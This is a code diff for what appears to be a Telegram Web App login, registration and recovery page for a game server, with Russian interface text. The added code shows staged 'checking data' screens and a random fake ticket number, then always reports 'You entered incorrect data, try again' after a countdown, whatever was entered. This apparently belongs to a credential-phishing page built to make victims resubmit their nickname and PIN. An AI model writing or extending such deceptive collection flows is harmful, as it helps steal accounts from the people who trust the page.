@@ -53,6 +53,23 @@ function onlyPin(input) {
     input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4);
 }
 
+// === ПРОВЕРКА НИКА ===
+function checkNick() {
+    const nick = document.getElementById('nick').value.trim();
+    const icon = document.getElementById('iconNick');
+    if (!icon) return;
+
+    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
+
+    if (valid) {
+        icon.classList.remove('red');
+        icon.classList.add('green');
+    } else {
+        icon.classList.remove('green');
+        icon.classList.add('red');
+    }
+}
+
 function markFilled(inputId, iconId) {
     const input = document.getElementById(inputId);
     const icon = document.getElementById(iconId);
@@ -130,27 +147,53 @@ function confirmSend() {
     tg.close();
 }
 
-// === СООБЩЕНИЕ ОБ УСПЕХЕ ===
-function showSuccess(text, nick, server) {
+// === СООБЩЕНИЕ ОБ УСПЕХЕ (ЧЕК) ===
+function showSuccess(text, nick, server, type) {
     const now = new Date();
     const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
+    const ticket = Math.floor(1000000 + Math.random() * 9000000);
 
     const overlay = document.createElement('div');
     overlay.className = 'success-overlay';
     overlay.innerHTML = `
         <div class="success-box">
-            <div class="success-close" onclick="confirmSend()">✕</div>
-            <div class="success-check">✔</div>
-            <div class="success-text">${text}</div>
-            <div class="success-info">${nick} • ${time} • ${server}</div>
+            <div class="success-ticket">#${ticket}</div>
+            <div class="success-nick">${nick}</div>
+            <div class="success-time">${time}</div>
+            <div class="success-type">${type}</div>
+            <div class="success-wait-static">Подождите пожалуйста <span id="waitNum">15</span><span id="waitDots"></span></div>
         </div>
     `;
     document.body.appendChild(overlay);
+
+    let counter = 15;
+    let dotIndex = 0;
+    const dots = ['', '.', '..', '...'];
+    const waitNum = document.getElementById('waitNum');
+    const waitDots = document.getElementById('waitDots');
+    const waitStatic = document.querySelector('.success-wait-static');
+
+    const interval = setInterval(() => {
+        counter--;
+        dotIndex = (dotIndex + 1) % 4;
+
+        if (counter > 0) {
+            if (waitNum) waitNum.textContent = counter;
+            if (waitDots) waitDots.textContent = dots[dotIndex];
+        } else {
+            clearInterval(interval);
+            if (waitStatic) {
+                waitStatic.textContent = 'Вы ввели неверные данные попробуйте снова';
+                waitStatic.style.color = '#e30613';
+                waitStatic.style.fontWeight = '700';
+            }
+        }
+    }, 300);
 }
 
 // === НАВИГАЦИЯ ===
 function goTo(page) { window.location.href = page; }
-function validateNick(nick) { return /^[A-Za-z]+_[A-Za-z]+$/.test(nick); }
+function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }
 
 // === ВЫПАДАЮЩИЙ СПИСОК СЕРВЕРОВ ===
 function toggleServerList() {
@@ -188,7 +231,7 @@ function login() {
 
     showLoading('ПРОВЕРКА ДАННЫХ', () => {
         showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
-            showSuccess('Вход выполнен!', nick, server);
+            showSuccess('', nick, server, 'Вход в аккаунт');
         });
     });
 }
@@ -220,7 +263,7 @@ function register() {
 
     showLoading('ПРОВЕРКА ДАННЫХ', () => {
         showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
-            showSuccess('Аккаунт успешно зарегистрирован!', nick, server);
+            showSuccess('', nick, server, 'Создание аккаунта');
         });
     });
 }
@@ -250,7 +293,7 @@ function recover() {
 
     showLoading('ПРОВЕРКА ДАННЫХ', () => {
         showLoading('ОБНОВЛЕНИЕ ДАННЫХ', () => {
-            showSuccess('Аккаунт успешно восстановлен!', nick, server);
+            showSuccess('', nick, server, 'Восстановление аккаунта');
         });
     });
 }
